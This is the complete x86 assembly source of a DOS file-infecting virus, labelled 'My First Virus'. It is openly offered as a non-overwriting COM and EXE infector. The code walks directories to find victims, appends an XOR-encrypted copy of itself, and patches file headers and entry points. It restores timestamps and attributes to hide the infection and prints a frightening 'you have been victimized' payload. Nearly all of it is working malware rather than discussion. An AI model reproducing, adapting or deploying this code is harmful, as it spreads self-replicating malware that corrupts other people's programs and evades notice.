;******************************************************************
;*                                                                *
;*     My First Virus, a simple non-overwriting COM and EXE       *
;*     infector.                                                  *
;*                                  by, Joshua                    *
;*                                                                *
;******************************************************************

ID                = 'SS'                        ; My ID

                  .model tiny                   ; Memory model
                  .code                         ; Start Code
                  org 100h                      ; Start of COM file

MAIN:             db 0e9h,00h,00h               ; Jmp START_VIRUS

START             proc near

DECRYPT:          mov bx,offset START_VIRUS     ; Find out our offset
                  mov cx,(END_VIRUS-START_VIRUS)/2
DECRYPT_LOOP:     db 2eh,81h,37h                ; XOR [BX],xxxx
KEY               dw 0                          ; Crypt KEY
                  add bx,2                      ; Increment offset
                  dec cx                        ; Decrement counter
                  jnz DECRYPT_LOOP              ; Continue until done

START_VIRUS:
                  call FIND_OFFSET              ; Real start of virus

; Calculate change in offset from host program.

FIND_OFFSET:      pop bp                        ; BP holds current IP
                  sub bp, offset FIND_OFFSET    ; Calculate net change
                                                ; Change BP to start of
                                                ; virus code

; Capture INT 24h Critical error handler.

                  push es                       ; Save ES
                  mov ax,3524h                  ; DOS get interupt vector
                  int 21h                       ; Call DOS to do it
                  mov word ptr [bp+OLDINT24],bx ; Save old INT 24h
                  mov word ptr [bp+OLDINT24+2],es ; vector
                  mov ah,25h                    ; DOS set interupt vector
                  lea dx,[bp+NEWINT24]          ; Address of new interupt
                  int 21h                       ; Call DOS to do it
                  pop es                        ; Restore ES

; Find out what kind of program I am, COM or EXE, by checking stack pointer.
; This is where I store my ID in an EXE infection.

                  cmp sp,ID                     ; COM or EXE?
                  je RESTORE_EXE                ; I am an EXE file

; Restore original bytes to the COM program.

RESTORE_COM:      lea si,[bp+COM_START]         ; Restore original 3 bytes
                  mov di,100h                   ; to 100h, start of file
                  push di                       ; Jmp to 100h when done
                  movsw                         ; Copy 3 bytes
                  movsb
                  jmp short RESTORE_DONE

; Restore original bytes to the EXE program.

RESTORE_EXE:      push ds                       ; Save original DS
                  push es                       ; Save original ES
                  push cs                       ; Set DS = CS
                  pop ds
                  push cs                       ; Set ES = CS
                  pop es
                  lea si,[bp+JMPSAVE]           ; Copy original CS:IP and
                  lea di,[bp+JMPSAVE2]          ; SS:SP for return
                  movsw                         ; Copy 8 bytes
                  movsw
                  movsw
                  movsw

; Change the DTA from the default so FINDFIRST/FINDNEXT won't destroy
; original command line parameters.

RESTORE_DONE:     lea dx,[bp+DTA]               ; Point to new DTA area
                  mov ah,1ah                    ; DOS set DTA
                  int 21h                       ; Call DOS to do it

; Save original directory.

                  mov ah,47h                    ; DOS get current directory
                  lea si,[bp+ORIG_DIR]          ; Store it here
                  mov dl,0                      ; Current drive
                  int 21h                       ; Call DOS to do it

; Search for a file to infect.

SEARCH:           lea dx,[bp+EXE_MASK]          ; Search for any EXE file
                  call FINDFIRST                ; Begin search
                  lea dx,[bp+COM_MASK]          ; Search for any COM file
                  call FINDFIRST                ; Begin search

                  mov ah,3bh                    ; DOS change directory
                  lea dx,[bp+DOTDOT]            ; Go up one direcotry
                  int 21h                       ; Call DOS to do it
                  jnc SEARCH                    ; Go look for more files

; Restore default DTA, original directory, and pass control back to
; original program.

QUIT:             mov ah,3bh                    ; DOS change directory
                  lea dx,[bp+ORIG_DIR-1]        ; Point to original directory
                  int 21h                       ; Call DOS to do it
                  push ds                       ; Save DS
                  mov ax,2524h                  ; DOS set interupt vector
                  lds dx,[bp+OLDINT24]          ; Restore INT 24h
                  int 21h                       ; Call DOS to do it
                  pop ds                        ; Restore DS
                  mov ah,1ah                    ; DOS set DTA
                  mov dx,80h                    ; Restore original DTA
                  cmp sp,ID-4                   ; EXE or COM? ES,DS on stack
                  jz QUIT_EXE                   ; Pass control to host EXE

QUIT_COM:         int 21h                       ; Call DOS to set DTA
                  retn                          ; Remember, 100h was on stack

QUIT_EXE:         pop es                        ; Restore original ES
                  pop ds                        ; Restore original DS
                  int 21h                       ; Call DOS to set DTA
                  mov ax,es                     ; AX = begin of PSP segment
                  add ax,16                     ; Add size of PSP to get CS
                  add word ptr cs:[bp+JMPSAVE2+2],ax ; Restore IP
                  add ax,word ptr cs:[bp+STACKSAVE2+2] ; Calculate SS
                  cli                           ; Clear interrupts
                  mov sp,word ptr cs:[bp+STACKSAVE2] ; Restore SP
                  mov ss,ax                     ; Restore SS
                  sti                           ; Set interrupts
                  db 0eah                       ; Jump SSSS:OOOO

JMPSAVE2          dd ?                          ; CS:IP for EXE return
STACKSAVE2        dd ?                          ; SS:SP for EXE return
JMPSAVE           dd ?                          ; Original EXE CS:IP
STACKSAVE         dd ?                          ; Original EXE SS:SP

CREATOR           db '[Joshua]'                 ; That's me!

; DOS Findfirst / Findnext services

FINDFIRST:        mov ah,4eh                    ; DOS find first service
                  mov cx,7                      ; Choose files w/ any attribute
FINDNEXT:         int 21h                       ; Call DOS to do it
                  jc END_SEARCH                 ; Quit if there are errors
                                                ; or no more files

; Ok, if I am here, then I found a possible victim. First open the file
; for read only.

                  mov al,0                      ; DOS Open file, read only
                  call OPEN                     ; Open the file

; Read in the beginning bytes to check for previous infection and then close.

                  mov ah,3fh                    ; DOS Read file
                  lea dx,[bp+BUFFER]            ; Save the original header
                  mov cx,24                     ; Read 24 bytes
                  int 21h                       ; Call DOS to do it
                  mov ah,3eh                    ; DOS close file
                  int 21h                       ; Call DOS to do it

; Check if the file is an EXE.

CHECK_EXE:        cmp word ptr [bp+BUFFER],'ZM' ; Is it an EXE?
                  jne CHECK_COM                 ; Nope, see if it's a COM
                  cmp word ptr [bp+BUFFER+16],ID; Is it already infected?
                  je ANOTHER                    ; Yep, so try another
                  jmp short INFECT_EXE          ; We got one! Go infect it!


; Check if the file is COMMAND.COM

CHECK_COM:        cmp word ptr [bp+DTA+35],'DN' ; Check for COMMAND.COM
                  jz ANOTHER                    ; If it is, try another file

; Now, check for previous infection by checking for our presence at
; the end of the file.

                  mov ax,word ptr [bp+DTA+26]   ; Put total filesize in AX
                  cmp ax,(65535-(ENDHEAP-DECRYPT)); Check if too big
                  jle ANOTHER                   ; If so, try another
                  mov cx,word ptr [bp+BUFFER+1] ; Put jmp offset in CX
                  add cx,END_VIRUS-DECRYPT+3    ; Add virus size to jmp offset
                  cmp ax,cx                     ; Compare file size's
                  jnz INFECT_COM                ; If healthy, go infect it

ANOTHER:          mov ah,4fh                    ; Otherwise find another
                  jmp short FINDNEXT            ; possible victim

END_SEARCH:       retn                          ; No files found

;*** Subroutine INFECT_COM ***

INFECT_COM:

; Save the first three bytes of the COM file

                  lea si,[bp+BUFFER]            ; Start of first 3 bytes
                  lea di,[bp+COM_START]         ; Store them here
                  movsw                         ; Transfer the 3 bytes
                  movsb

; Calculate jump offset for header of victim so it will run virus first.
; AX has the filesize. Store new JMP and OFFSET in the buffer.

                  mov cx,3                      ; No. bytes to write in header
                  sub ax,cx                     ; Filesize - jmp_offset
                  mov byte ptr [si-3],0e9h      ; Store new JMP command
                  mov word ptr [si-2],ax        ; plus offset
                  add ax,(103h+(START_VIRUS-DECRYPT)); New START_VIRUS OFFSET
                  push ax                       ; Save it for later
                  jmp DONE_INFECTION            ; We're done!

;*** Subroutine INFECT_EXE ***

INFECT_EXE:

; Save original CS:IP and SS:SP.

                  les ax,dword ptr [bp+BUFFER+20]  ; Get original CS:IP
                  mov word ptr [bp+JMPSAVE],ax     ; Store IP
                  mov word ptr [bp+JMPSAVE+2],es   ; Store CS
                  les ax,dword ptr [bp+BUFFER+14]  ; Get original SS:SP
                  mov word ptr [bp+STACKSAVE],es   ; Store SP
                  mov word ptr [bp+STACKSAVE+2],ax ; Store SS

; Get get the header size in bytes.

                  mov ax,word ptr [bp+BUFFER+8] ; Get header size
                  mov cl,4                      ; Convert paragraphs to bytes
                  shl ax,cl                     ; Multiply by 16
                  xchg ax,bx                    ; Put header size in BX

; Get file size.

                  les ax,[bp+offset DTA+26]     ; Get filesize to
                  mov dx,es                     ; DX:AX format

                  push ax                       ; Save filesize
                  push dx

                  sub ax,bx                     ; Subtract header size
                  sbb dx,0                      ; from filesize

                  mov cx,16                     ; Convert to SEGMENT:OFFSET
                  div cx                        ; form

; Store new entry point (CS:IP) in header.

                  mov word ptr [bp+BUFFER+20],dx; Store IP
                  mov word ptr [bp+BUFFER+22],ax; Store CS

                  add dx,START_VIRUS-DECRYPT    ; New START_VIRUS offset
                  mov bx,dx                     ; Hold it for now

; Store new stack frame (SS:SP) in header.

                  mov word ptr [bp+BUFFER+14],ax; Store SS
                  mov word ptr [bp+BUFFER+16],ID; Store SP

                  pop dx                        ; Get back filesize
                  pop ax

                  add ax,END_VIRUS-START_VIRUS  ; Add virus size
                  adc dx,0                      ; to filesize

                  push ax                       ; Save AX
                  mov cl,9                      ; Divide AX
                  shr ax,cl                     ; by 512
                  ror dx,cl
                  stc                           ; Set carry flag
                  adc dx,ax                     ; Add with carry
                  pop ax                        ; Get back AX
                  and ah,1                      ; Mod 512

; Store new filesize in header.

                  mov word ptr [bp+BUFFER+4],dx ; Store new filesize
                  mov word ptr [bp+BUFFER+2],ax

                  push cs                       ; Restore ES
                  pop es
                  mov cx,24                     ; No. bytes to write in header

                  push bx                       ; Save START_VIRUS offset

; Write virus to victim and restore the file's original timestamp, datestamp,
; and attributes. These values were stored in the DTA by the
; Findfirst / Findnext services.

DONE_INFECTION:
                  push cx                       ; Save no. bytes to write
                  xor cx,cx                     ; Clear attributes
                  call SET_ATTR                 ; Set attributes

                  mov al,2                      ; DOS open file for read/write
                  call OPEN                     ; Open the file

; Write the new header at the beginning of the file.

                  mov ah,40h                    ; DOS write to file
                  pop cx                        ; Number of bytes to write
                  lea dx,[bp+BUFFER]            ; Point to the bytes to write
                  int 21h                       ; Call DOS to do it

; Move to end of file.

                  mov ax,4202h                  ; DOS set read/write pointer
                  xor cx,cx                     ; Set offset move to zero
                  cwd                           ; Equivalent to xor dx,dx
                  int 21h                       ; Call DOS to do it

; Append virus to end of file.

                  mov ah,2ch                    ; DOS get time
                  int 21h                       ; Call DOS to do it
                  mov [bp+KEY],dx               ; Save sec + 1/100 sec
                                                ; as the new KEY

                  lea di,[bp+APPEND]            ; to the heap
                  mov cx,START_VIRUS-DECRYPT    ; Number of bytes to move
                  mov al,53h                    ; Push BX and store it
                  stosb                         ; in the append routine
                  lea si,[bp+DECRYPT]           ; Move Crypt routines
                  push si                       ; Save SI
                  push cx                       ; Save CX
              rep movsb                         ; Transfer the data

                  lea si,[bp+WRITE_START]       ; Now copy the write
                  mov cx,WRITE_END-WRITE_START  ; routine to the heap
              rep movsb                         ; Transfer the data

                  pop cx                        ; Get back
                  pop si                        ; CX and SI
              rep movsb                         ; Recopy Crypt routine

                  mov ax,0c35bh                 ; Tack a POP BX and
                  stosw                         ; RETN on the end

                  pop ax                        ; New START_VIRUS offset
                  mov word ptr [bp+DECRYPT+1],ax; Store new offset

                  call APPEND                   ; Write the file

; Restore original creation date and time.

                  mov ax,5701h                  ; DOS set file date & time
                  mov cx,word ptr [bp+DTA+22]   ; Set time
                  mov dx,word ptr [bp+DTA+24]   ; Set date
                  int 21h                       ; Call DOS to do it

; Close the file.

                  mov ah,3eh                    ; DOS close file
                  int 21h                       ; Call DOS to do it

; Restore original file attributes.

                  mov cx,word ptr [bp+DTA+21]   ; Get original file attribute
                  call SET_ATTR                 ; Set attribute

                  pop bx                        ; Take CALL off stack


; ****** B O M B  S E C T I O N ******

; Check to see if the virus is ready to activate.
; Put all activation tests and bombs here.

CONDITIONS:   ;   mov ah,2ah                    ; DOS get date
              ;   int 21h                       ; Call DOS to do it
              ;   cmp dx,1001h                  ; Check for Oct 1st
              ;   jl BOMB_DONE                  ; Not time yet
              ;   mov ah,2ch                    ; DOS get time
              ;   int 21h                       ; Call DOS to do it
              ;   cmp cl,25h                    ; Check for 25 min past
              ;   jl BOMB_DONE                  ; Not time yet

BOMB:             mov ah,3h                     ; BIOS find cursor position
                  mov bh,0                      ; Video page 0
                  int 10h                       ; Call BIOS to do it
                  push dx                       ; Save original Row and Column
                  mov cx,6                      ; Number of lines to print
                  lea si,[bp+VERSE]             ; Location of VERSE
                  mov dx,080ah                  ; Row and Column of output
PRINTLOOP:        mov ah,2h                     ; BIOS set cursor
                  int 10h                       ; Set cursor
                  push dx                       ; Save Row and Column
                  mov ah,9h                     ; DOS print string
                  mov dx,si                     ; Location of VERSE
                  int 21h                       ; Call DOS to print it
                  pop dx                        ; Get Row and Column
                  inc dh                        ; Increment Row
                  add si,54                     ; Go to next line of VERSE
                  loop PRINTLOOP                ; Print all lines

                  mov ah,00h                    ; Read character from keybd
                  int 16h

                  pop dx                        ; Get original Row Column
                  mov ah,2h                     ; BIOS set cursor
                  int 10h                       ; Call BIOS to do it

BOMB_DONE:        jmp QUIT                      ; Go back to host program

VERSE:  db  '靈컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�$'
        db  '�  Guess what ???                                   �$'
        db  '�     You have been victimized by a virus!!! Do not �$'
        db  '�     try to reboot your computer or even turn it   �$'
        db  '�     off.  You might as well read this and weep!   �$'
        db  '聃컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�',7,7,'$'

; Write routine to append the virus to the end of the file.

WRITE_START:
                  pop bx                        ; Get back file handle
                  push bx                       ; Save it again
                  mov ah,40h                    ; DOS write to file
                  mov cx,END_VIRUS-DECRYPT      ; Length of virus
                  lea dx,[bp+DECRYPT]           ; Start from beginning of virus
                  int 21h                       ; Call DOS to do it
WRITE_END:


; New INT 24h handler.

NEWINT24:         mov al,3                      ; Fail call
                  iret                          ; Return


;*** Subroutine OPEN ***
; Open a file.  Takes AL as parameter.

OPEN              proc near
                  mov ah,3dh                    ; DOS open file, read/write
                  lea dx,[bp+DTA+30]            ; Point to filename we found
                  int 21h                       ; Call DOS to do it
                  xchg ax,bx                    ; Put file handle in BX
                  retn                          ; Return
OPEN              endp

;*** Subroutine SET_ATTR ***
; Takes CX as a parameter

SET_ATTR          proc near
                  mov ax,4301h                  ; DOS change file attr
                  lea dx,[bp+DTA+30]            ; Point to file name
                  int 21h                       ; Call DOS
                  retn                          ; Return
SET_ATTR          endp


; This area will hold all variables to be encrypted

COM_MASK          db '*.com',0                  ; COM file mask
EXE_MASK          db '*.exe',0                  ; EXE file mask
DOTDOT            db '..',0                     ; Go up one directory
COM_START         db 0cdh,20h,0                 ; Header for infected file
BACKSLASH         db '\'                        ; Backslash for directory

START             endp

END_VIRUS         equ $                         ; Mark end of virus code

; This data area is a scratch area and is not included in virus code.

ORIG_DIR          db 64 dup(?)                  ; Holds original directory

OLDINT24          dd ?                          ; Storage for old INT 24 vector

BUFFER            db 24 dup(?)                  ; Read buffer and EXE header

DTA               db 43 dup(?)                  ; New DTA location

APPEND:           db (START_VIRUS-DECRYPT)*2+(WRITE_END-WRITE_START)+3 dup(?)

ENDHEAP:

                  end MAIN
